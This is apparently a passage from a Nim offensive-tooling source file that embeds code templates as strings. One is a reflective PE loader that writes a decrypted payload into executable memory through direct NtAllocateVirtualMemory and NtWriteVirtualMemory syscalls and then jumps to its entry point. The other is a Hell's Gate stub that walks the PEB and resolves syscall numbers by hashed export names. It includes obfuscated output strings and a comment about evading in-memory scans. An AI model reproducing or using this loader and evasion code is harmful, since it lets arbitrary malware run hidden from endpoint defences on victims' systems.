          var libaddr: size_t = cast[size_t](MyGetProcAddress(MyLoadLibraryA(libname),cast[LPSTR]((orginThunk.u1.Ordinal and 0xFFFF))))
          fieldThunk.u1.Function = ULONGLONG(libaddr)
        if fieldThunk.u1.Function == 0:
          break
        if fieldThunk.u1.Function == orginThunk.u1.Function:
          var nameData: PIMAGE_IMPORT_BY_NAME = cast[PIMAGE_IMPORT_BY_NAME](orginThunk.u1.AddressOfData)
          var byname: PIMAGE_IMPORT_BY_NAME = cast[PIMAGE_IMPORT_BY_NAME](cast[ULONGLONG](modulePtr) + cast[DWORD](nameData))
          
    
          var func_name: LPCSTR = cast[LPCSTR](addr byname.Name)
          
          let asd = byname.Name
          var hmodule: HMODULE = MyLoadLibraryA(libname)
          var libaddr: csize_t = cast[csize_t](MyGetProcAddress(hmodule,func_name))
          
    
          fieldThunk.u1.Function = ULONGLONG(libaddr)
    
        inc(offsetField, sizeof((IMAGE_THUNK_DATA)))
        inc(offsetThunk, sizeof((IMAGE_THUNK_DATA)))
      inc(parsedSize, sizeof((IMAGE_IMPORT_DESCRIPTOR)))
    return true

proc pwndem(): void =

    let tProcess2 = MyGetCurrentProcessId()
    var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
    
    var shellcodePtr: ptr = dectext[0].addr

    var pImageBase: ptr BYTE = nil
    var preferAddr: LPVOID = nil
    var ntHeader: ptr IMAGE_NT_HEADERS = cast[ptr IMAGE_NT_HEADERS](getNtHdrs(shellcodePtr))
    if (ntHeader == nil):
      echo obf("[+] File isn't a PE file.")
      quit()

    var relocDir: ptr IMAGE_DATA_DIRECTORY = getPeDir(shellcodePtr,IMAGE_DIRECTORY_ENTRY_BASERELOC)
    preferAddr = cast[LPVOID](ntHeader.OptionalHeader.ImageBase)
    
    echo $ntHeader.OptionalHeader.SizeOfImage
    
    var allocsize: SIZE_T = cast[SIZE_T](ntHeader.OptionalHeader.SizeOfImage)
    var ds: LPVOID

    if getSyscall(ntAllocTable):
        syscall = ntAllocTable.wSysCall
    else:
        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")

    var status: NTSTATUS = NtAllocateVirtualMemory(pHandle2, &preferAddr, 0, &allocsize,MEM_COMMIT or MEM_RESERVE,PAGE_EXECUTE_READWRITE)
    
    echo obf("NtAllocateVirtualMemory:")
    echo status
    
    
    if (preferAddr == nil and relocDir == nil):
      echo obf("[-] Allocate Image Base At Failure.\n")
      quit()
    
    ntHeader.OptionalHeader.ImageBase = cast[ULONGLONG](preferAddr)
    
    if getSyscall(ntWriteTable):
        syscall = ntWriteTable.wSysCall
    else:
        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")

    var bytesWritten: SIZE_T
    status = NtWriteVirtualMemory(pHandle2,preferAddr,shellcodePtr,ntHeader.OptionalHeader.SizeOfHeaders,addr bytesWritten)
    
    echo obf("NtWriteVirtualMemory:")
    echo status
    
    
    var SectionHeaderArr: ptr IMAGE_SECTION_HEADER = cast[ptr IMAGE_SECTION_HEADER]((cast[size_t](ntHeader) + sizeof((IMAGE_NT_HEADERS))))
    var i: int = 0
    while i < cast[int](ntHeader.FileHeader.NumberOfSections):
      var dest: LPVOID = (preferAddr + SectionHeaderArr[i].VirtualAddress)
      var source: LPVOID = (shellcodePtr + SectionHeaderArr[i].PointerToRawData)
      status = NtWriteVirtualMemory(pHandle2,dest,source,cast[DWORD](SectionHeaderArr[i].SizeOfRawData),addr bytesWritten)
      echo obf("NtWriteVirtualMemory for section: "), toString(SectionHeaderArr[i].Name)
      echo status
      inc(i)
    
    var goodrun = fixIAT(preferAddr)
    
    if preferAddr != preferAddr:
      discard applyReloc(cast[ULONGLONG](preferAddr), cast[ULONGLONG](preferAddr), preferAddr,ntHeader.OptionalHeader.SizeOfImage)
    var retAddr: HANDLE = cast[HANDLE](preferAddr) + cast[HANDLE](ntHeader.OptionalHeader.AddressOfEntryPoint)

    let f = cast[proc(){.nimcall.}](retAddr)
    f()

#[
    var 
      protectAddress = preferAddr
      op: ULONG
      t: ULONG
    # Setting the protection to PAGE_NOACCESS afterwards could bypass in memory scans if the execution was completed fast enough.
    status =  NtProtectVirtualMemory(pHandle2,addr protectAddress,addr allocsize,0x01,addr op)
    if (status != 0):
        echo obf("NtProtectVirtualMemory failed")
        echo status
        echo GetLastError()
    else:
        echo obf("[*] OldProtect set back")

]#


when isMainModule:
     pwndem()

"""

let HellsgateStub*  = """

import winim/lean as winimport

{.passC:"-masm=intel".}

    #[
        Windows Undocumented Structures - Windows 7+
    ]#

type
    # https://doxygen.reactos.org/d3/d71/struct__ASSEMBLY__STORAGE__MAP__ENTRY.html
    ASSEMBLY_STORAGE_MAP {.pure.} = object
        Flags*      : winimport.ULONG
        DosPath*    : winimport.UNICODE_STRING
        Handle*     : winimport.HANDLE
    PASSEMBLY_STORAGE_MAP* = ptr ASSEMBLY_STORAGE_MAP

    LDR_DLL_LOAD_REASON* {.pure.} = enum
        LoadReasonUnknown                       = -1
        LoadReasonStaticDependency              = 0
        LoadReasonStaticForwarderDependency     = 1
        LoadReasonDynamicForwarderDependency    = 2
        LoadReasonDelayloadDependency           = 3
        LoadReasonDynamicLoad                   = 4
        LoadReasonAsImageLoad                   = 5
        LoadReasonAsDataLoad                    = 6
        LoadReasonEnclavePrimary                = 7
        LoadReasonEnclaveDependency             = 8

    RTL_BALANCED_NODE_STRUCT1* {.pure.} = object
        Left* : PRTL_BALANCED_NODE
        Right* : PRTL_BALANCED_NODE

    RTL_BALANCED_NODE_UNION1* {.pure, union.} = object
        Children* : array[2, PRTL_BALANCED_NODE]
        Struct1*  : RTL_BALANCED_NODE_STRUCT1

    RTL_BALANCED_NODE_UNION2* {.pure, union.} = object
        Red*        {.bitsize:1.}   : winimport.UCHAR
        Balance*    {.bitsize:2.}   : winimport.UCHAR
        ParentValue*                : winimport.ULONG_PTR

    RTL_BALANCED_NODE* {.pure.} = object
        Union1* : RTL_BALANCED_NODE_UNION1
        Union2* : RTL_BALANCED_NODE_UNION2
    PRTL_BALANCED_NODE* = ptr RTL_BALANCED_NODE

    LDR_DATA_TABLE_ENTRY_UNION_ONE* {.pure, union.} = object
        InInitializationOrderLinks*  : winimport.LIST_ENTRY
        InProgressLinks*             : winimport.LIST_ENTRY
    PLDR_DATA_TABLE_ENTRY_UNION_ONE* = ptr LDR_DATA_TABLE_ENTRY_UNION_ONE

    LDR_DATA_TABLE_ENTRY_STRUCT_ONE* {.pure.} = object
        PackagedBinary* {.bitsize:1.}           : winimport.ULONG
        MarkedForRemoval* {.bitsize:1.}         : winimport.ULONG
        ImageDll* {.bitsize:1.}                 : winimport.ULONG
        LoadNotificationSent* {.bitsize:1.}     : winimport.ULONG
        TelemetryEntryProcessed* {.bitsize:1.}  : winimport.ULONG
        ProcessStaticImport* {.bitsize:1.}      : winimport.ULONG
        InLegacyLists* {.bitsize:1.}            : winimport.ULONG
        InIndexes* {.bitsize:1.}                : winimport.ULONG
        ShimDll* {.bitsize:1.}                  : winimport.ULONG
        InExceptionTable* {.bitsize:1.}         : winimport.ULONG
        ReservedFlags1* {.bitsize:2.}           : winimport.ULONG
        LoadInProgress* {.bitsize:1.}           : winimport.ULONG
        LoadConfigProcessed* {.bitsize:1.}      : winimport.ULONG
        EntryProcessed* {.bitsize:1.}           : winimport.ULONG
        ProtectDelayLoad* {.bitsize:1.}         : winimport.ULONG
        ReservedFlags3* {.bitsize:2.}           : winimport.ULONG
        DontCallForThreads* {.bitsize:1.}       : winimport.ULONG
        ProcessAttachCalled* {.bitsize:1.}      : winimport.ULONG
        ProcessAttachFailed* {.bitsize:1.}      : winimport.ULONG
        CorDeferredValidate* {.bitsize:1.}      : winimport.ULONG
        CorImage* {.bitsize:1.}                 : winimport.ULONG
        DontRelocate {.bitsize:1.}              : winimport.ULONG
        CorILOnly* {.bitsize:1.}                : winimport.ULONG
        ChpeImage* {.bitsize:1.}                : winimport.ULONG
        ReservedFlags5* {.bitsize:2.}           : winimport.ULONG
        Redirected* {.bitsize:1.}               : winimport.ULONG
        ReservedFlags6* {.bitsize:2.}           : winimport.ULONG
        CompatDatabaseProcessed* {.bitsize:1.}  : winimport.ULONG

    LDR_DATA_TABLE_ENTRY_UNION_TWO* {.pure, union.} = object
        FlagGroup*   : array[4, winimport.UCHAR]
        Flags*       : winimport.ULONG
        Struct*      : LDR_DATA_TABLE_ENTRY_STRUCT_ONE            
    PLDR_DATA_TABLE_ENTRY_UNION_TWO* = ptr LDR_DATA_TABLE_ENTRY_UNION_TWO
    
    LDR_DATA_TABLE_ENTRY* {.pure.} = object
        InLoadOrderLinks*               : winimport.LIST_ENTRY
        InMemoryOrderLinks*             : winimport.LIST_ENTRY
        Union_1*                        : LDR_DATA_TABLE_ENTRY_UNION_ONE
        DLLBase*                        : winimport.PVOID
        EntryPoint*                     : winimport.PVOID
        SizeOfImage*                    : winimport.ULONG
        FullDllName*                    : winimport.UNICODE_STRING
        BaseDllName*                    : winimport.UNICODE_STRING
        Union_2*                        : LDR_DATA_TABLE_ENTRY_UNION_TWO
        ObsoleteLoadCount               : winimport.USHORT
        TlsIndex*                       : winimport.USHORT
        HashLinks*                      : winimport.LIST_ENTRY
        TimeDateStamp*                  : winimport.ULONG
        EntryPointActivationContext*    : winimport.PVOID
        Lock*                           : winimport.PVOID
        DdgagNode*                      : winimport.PVOID       # PLDR_DDAG_NODE
        NodeModuleLink*                 : winimport.LIST_ENTRY
        LoadContext*                    : winimport.PVOID       # PLDRP_LOAD_CONTEXT
        ParentDllBase                   : winimport.PVOID
        SwitchBackContext*              : winimport.PVOID
        BaseAddressIndexNode*           : RTL_BALANCED_NODE
        MappingInfoIndexNode*           : RTL_BALANCED_NODE
        OriginalBase*                   : winimport.ULONG_PTR
        LoadTime*                       : winimport.LARGE_INTEGER
        BaseNameHashValue*              : winimport.ULONG
        LoadReason*                     : LDR_DLL_LOAD_REASON
        ImplicitPathOptions*            : winimport.ULONG
        ReferenceCount*                 : winimport.ULONG
        DependentLoadFlags*             : winimport.ULONG
        SigningLevel*                   : winimport.UCHAR
    PLDR_DATA_TABLE_ENTRY* = ptr LDR_DATA_TABLE_ENTRY

    PEB_LDR_DATA* {.pure.} = object
        Length*                             : winimport.ULONG
        Initialized*                        : winimport.BOOLEAN
        SsHandle*                           : winimport.PVOID
        InLoadOrderModuleList*              : winimport.LIST_ENTRY
        InMemoryOrderModuleList*            : winimport.LIST_ENTRY
        InInitializationOrderModuleList*    : winimport.LIST_ENTRY
        EntryInProgress*                    : winimport.PVOID
        ShutdownInProgress*                 : winimport.BOOLEAN
        ShutdownThreadId*                   : winimport.HANDLE
    PPEB_LDR_DATA* = ptr PEB_LDR_DATA

    PEB* {.pure.} = object
        InheritedAddressSpace*                  : winimport.BOOLEAN
        ReadImageFileExecOptions*               : winimport.BOOLEAN
        BeingDebugged*                          : winimport.BOOLEAN
        PebUnion1*                              : winimport.UCHAR
        Padding0*                               : array[4, winimport.UCHAR]
        Mutant*                                 : winimport.HANDLE
        ImageBaseAddress*                       : winimport.PVOID
        Ldr*                                    : PPEB_LDR_DATA                             
        ProcessParameters*                      : winimport.PRTL_USER_PROCESS_PARAMETERS  
        SubSystemData*                          : winimport.PVOID                         
        ProcessHeap*                            : winimport.HANDLE                        
        FastPebLock*                            : winimport.PVOID          # PRTL_CRITICAL_SECTION
        AtlThunkSListPtr*                       : winimport.PVOID                         
        IFEOKey*                                : winimport.PVOID                         
        PebUnion2*                              : winimport.ULONG                         
        Padding1*                               : array[4, winimport.UCHAR]               
        KernelCallBackTable*                    : ptr winimport.PVOID                     
        SystemReserved*                         : winimport.ULONG                         
        AltThunkSListPtr32*                     : winimport.ULONG                         
        ApiSetMap*                              : winimport.PVOID                         
        TlsExpansionCounter*                    : winimport.ULONG                         
        Padding2*                               : array[4, winimport.UCHAR]               
        TlsBitmap*                              : winimport.PVOID                         
        TlsBitmapBits*                          : array[2, winimport.ULONG]               
        ReadOnlyShareMemoryBase*                : winimport.PVOID                         
        SharedData*                             : winimport.PVOID                         
        ReadOnlyStaticServerData*               : ptr winimport.PVOID                     
        AnsiCodePageData*                       : winimport.PVOID                         
        OemCodePageData*                        : winimport.PVOID                         
        UnicodeCaseTableData*                   : winimport.PVOID                         
        NumberOfProcessors*                     : winimport.ULONG                         
        NtGlobalFlag*                           : winimport.ULONG                         
        CriticalSectionTimeout*                 : winimport.LARGE_INTEGER                 
        HeapSegmentReserve*                     : winimport.ULONG_PTR                     
        HeapSegmentCommit*                      : winimport.ULONG_PTR                     
        HeapDeCommitTotalFreeThreshold*         : winimport.ULONG_PTR                     
        HeapDeCommitFreeBlockThreshold*         : winimport.ULONG_PTR                     
        NumberOfHeaps*                          : winimport.ULONG                         
        MaximumNumberOfHeaps*                   : winimport.ULONG                         
        ProcessHeaps*                           : ptr winimport.PVOID                     
        GdiSharedHandleTable*                   : winimport.PVOID                         
        ProcessStarterHelper*                   : winimport.PVOID                         
        GdiDCAttributeList*                     : winimport.ULONG                         
        Padding3*                               : array[4, winimport.UCHAR]               
        LoaderLock*                             : winimport.PVOID           # PRTL_CRITICAL_SECTION
        OSMajorVersion*                         : winimport.ULONG
        OSMinorVersion*                         : winimport.ULONG
        OSBuildNumber*                          : winimport.USHORT
        OSCSDVersion*                           : winimport.USHORT
        OSPlatformId*                           : winimport.ULONG
        ImageSubsystem*                         : winimport.ULONG
        ImageSubsystemMajorVersion*             : winimport.ULONG
        ImageSubsystemMinorVersion*             : winimport.ULONG
        Padding4                                : array[4, winimport.UCHAR]
        ActiveProcessAffinityMask*              : winimport.PVOID            # KAFFINITY
        GdiHandleBuffer                         : array[0x3c, winimport.ULONG]
        PostProcessInitRoutine*                 : winimport.VOID
        TlsExpansionBitmap*                     : winimport.PVOID
        TlsExpansionBitmapBits*                 : array[0x20, winimport.ULONG]
        SessionId*                              : winimport.ULONG
        Padding5*                               : array[4, winimport.UCHAR]
        AppCompatFlags*                         : winimport.ULARGE_INTEGER
        AppCompatFlagsUser*                     : winimport.ULARGE_INTEGER
        ShimData*                               : winimport.PVOID
        AppCompatInfo*                          : winimport.PVOID
        CSDVersion*                             : winimport.UNICODE_STRING
        ActivationContextData*                  : winimport.PVOID             # PACTIVATION_CONTEXT_DATA 
        ProcessAssemblyStorageMap*              : winimport.PVOID             # PASSEMBLY_STORAGE_MAP
        SystemDefaultActivationContextData*     : winimport.PVOID             # PACTIVATION_CONTEXT_DATA
        SystemAssemblyStorageMap*               : winimport.PVOID             # PASSEMBLY_STORAGE_MAP
        MinimumStackCommit*                     : winimport.ULONG_PTR
        Sparepointers*                          : array[4, winimport.PVOID]
        SpareUlongs*                            : array[5, winimport.ULONG]
        WerRegistrationData*                    : winimport.PVOID
        WerShipAssertPtr*                       : winimport.PVOID
        Unused*                                 : winimport.PVOID
        ImageHeaderHash*                        : winimport.PVOID
        TracingFlags*                           : winimport.ULONG
        CsrServerReadOnlySharedMemoryBase*      : winimport.ULONGLONG
        TppWorkerpListLock*                     : winimport.ULONG
        TppWorkerpList*                         : winimport.LIST_ENTRY
        WaitOnAddressHashTable*                 : array[0x80, winimport.PVOID]
        TelemtryCoverageHeader*                 : winimport.PVOID
        CloudFileFlags*                         : winimport.ULONG
        CloudFileDiagFlags*                     : winimport.ULONG
        PlaceholderCompatabilityMode*           : winimport.CHAR
        PlaceholderCompatabilityModeReserved*   : array[7, winimport.CHAR]
        LeapSecondData*                         : winimport.PVOID
        LeapSecondFlags*                        : winimport.ULONG
        NtGlobalFlag2*                          : winimport.ULONG
    PPEB* = ptr PEB

    TEB* {.pure.} = object
        NtTib*                                  : winimport.NT_TIB
        EnvironmentPointer*                     : winimport.PVOID
        ClientId*                               : winimport.CLIENT_ID
        ActiveRpcHandle*                        : winimport.PVOID
        ThreadLocalStoragePointer*              : winimport.PVOID
        ProcessEnvironmentBlock*                : PEB
        LastErrorValue*                         : winimport.ULONG
        CountOfOwnedCriticalSections*           : winimport.ULONG
        CsrClientThread*                        : winimport.PVOID
        Win32ThreadInfo*                        : winimport.PVOID
        User32Reserved*                         : array[0x1A, winimport.ULONG]
        UserReserved*                           : array[5, winimport.ULONG]
        WOW32Reserved*                          : winimport.PVOID
        CurrentLocale*                          : winimport.ULONG
        FpSoftwareStatusRegister*               : winimport.ULONG
        ReservedForDebuggerInstrumentation*     : array[0x10, winimport.PVOID]
    PTEB* = ptr TEB





var syscall*  : WORD
type
    HG_TABLE_ENTRY* = object
        pAddress*    : PVOID
        dwHash*      : uint64
        wSysCall*    : WORD
    PHG_TABLE_ENTRY* = ptr HG_TABLE_ENTRY

proc djb2_hash*(pFuncName : string) : uint64 =

    var hash : uint64 = 0x5381

    for c in pFuncName:
        hash = ((hash shl 0x05) + hash) + cast[uint64](ord(c))

    return hash

proc moduleToBuffer*(pCurrentModule : PLDR_DATA_TABLE_ENTRY) : PWSTR =
    return pCurrentModule.FullDllName.Buffer

proc flinkToModule*(pCurrentFlink : LIST_ENTRY) : PLDR_DATA_TABLE_ENTRY =
    return cast[PLDR_DATA_TABLE_ENTRY](cast[ByteAddress](pCurrentFlink) - 0x10)

proc getExportTable*(pCurrentModule : PLDR_DATA_TABLE_ENTRY, pExportTable : var PIMAGE_EXPORT_DIRECTORY) : bool =

    let 
        pImageBase : PVOID              = pCurrentModule.DLLBase
        pDosHeader : PIMAGE_DOS_HEADER  = cast[PIMAGE_DOS_HEADER](pImageBase)
        pNTHeader : PIMAGE_NT_HEADERS = cast[PIMAGE_NT_HEADERS](cast[ByteAddress](pDosHeader) + pDosHeader.e_lfanew)

    if pDosheader.e_magic != IMAGE_DOS_SIGNATURE:
        return false

    if pNTHeader.Signature != cast[DWORD](IMAGE_NT_SIGNATURE):
        return false

    pExportTable = cast[PIMAGE_EXPORT_DIRECTORY](cast[ByteAddress](pImageBase) + pNTHeader.OptionalHeader.DataDirectory[0].VirtualAddress)

    return true

proc getTableEntry*(pImageBase : PVOID, pCurrentExportDirectory : PIMAGE_EXPORT_DIRECTORY, tableEntry : var HG_TABLE_ENTRY) : bool =

    var 
        cx : DWORD = 0
        numFuncs : DWORD = pCurrentExportDirectory.NumberOfNames
    let 
        pAddrOfFunctions    : ptr UncheckedArray[DWORD] = cast[ptr UncheckedArray[DWORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfFunctions)
        pAddrOfNames        : ptr UncheckedArray[DWORD] = cast[ptr UncheckedArray[DWORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfNames)
        pAddrOfOrdinals     : ptr UncheckedArray[WORD]  = cast[ptr UncheckedArray[WORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfNameOrdinals)

    while cx < numFuncs:    
        var 
            pFuncOrdinal    : WORD      = pAddrOfOrdinals[cx]
            pFuncName       : string    = $(cast[PCHAR](cast[ByteAddress](pImageBase) + pAddrOfNames[cx]))
            funcHash        : uint64    = djb2_hash(pFuncName)
            funcRVA         : DWORD64   = pAddrOfFunctions[pFuncOrdinal]
            pFuncAddr       : PVOID     = cast[PVOID](cast[ByteAddress](pImageBase) + funcRVA)
        
        if funcHash == tableEntry.dwHash:

            tableEntry.pAddress = pFuncAddr
            if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3)[] == 0xB8:
                tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4)[]

            return true
        inc cx
    return false

proc GetPEBAsm64*(): PPEB {.asmNoStackFrame.} =
    asm ===
        mov rax, qword ptr gs:[0x60]
        ret
    ===

proc getNextModule*(flink : var LIST_ENTRY) : PLDR_DATA_TABLE_ENTRY =
    flink = flink.Flink[]
    return flinkToModule(flink)

proc searchLoadedModules*(pCurrentPeb : PPEB, tableEntry : var HG_TABLE_ENTRY) : bool =
    var 
        currFlink       : LIST_ENTRY                = pCurrentPeb.Ldr.InMemoryOrderModuleList.Flink[]
        currModule      : PLDR_DATA_TABLE_ENTRY     = flinkToModule(currFlink)                 
        moduleName      : string
        pExportTable    : PIMAGE_EXPORT_DIRECTORY
    let 
        beginModule = currModule
    
    while true:

        moduleName = $moduleToBuffer(currModule)

        if moduleName.len() == 0 or moduleName in paramStr(0):            
            currModule = getNextModule(currFlink)
            if beginModule == currModule:
                break
            continue

        if not getExportTable(currModule, pExportTable):
            echo obf("[-] Failed to get export table...")
            return false

        if getTableEntry(currModule.DLLBase, pExportTable, tableEntry):
            return true
        
        currModule = getNextModule(currFlink)
        if beginModule == currModule:
            break
    return false

proc getSyscall*(tableEntry : var HG_TABLE_ENTRY) : bool =
    
    let currentPeb  : PPEB = GetPEBAsm64()
       
    if not searchLoadedModules(currentPeb, tableEntry):
        return false

    return true

"""

